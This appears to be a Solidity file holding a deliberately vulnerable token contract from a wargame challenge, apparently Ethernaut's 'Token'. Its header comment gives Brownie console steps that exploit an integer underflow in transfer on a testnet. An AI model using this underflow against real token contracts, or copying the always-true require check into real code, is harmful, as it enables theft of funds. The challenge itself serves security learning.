/* 

Note : this challenge can be solved by exploting the underflow vulnerability in the transfer function 

# Open brownie console with rinkeby testnet

brownie console --network rinkeby

# import your account using mnemonic

accounts.from_mnemonic("your account mnemonic")

# point Token contract to your Token Challenge address

Token_ctr = Token.at("TokenChallengeAddress")

# check your balance

Token_ctr.balanceOf(a[0])

# call transfer, with 21. since your current balance is 20, then 20 - 21 will cause underflow in balances[msg.sender] -= _value 

Token_ctr.transfer("AccountToreceiveToken",21,{'from': a[0]})

# check your balance

Token_ctr.balanceOf(a[0])

# submit instance

*/



// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Token {

  mapping(address => uint) balances;
  uint public totalSupply;

  constructor(uint _initialSupply) public {
    balances[msg.sender] = totalSupply = _initialSupply;
  }

  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }

  function balanceOf(address _owner) public view returns (uint balance) {
    return balances[_owner];
  }
}

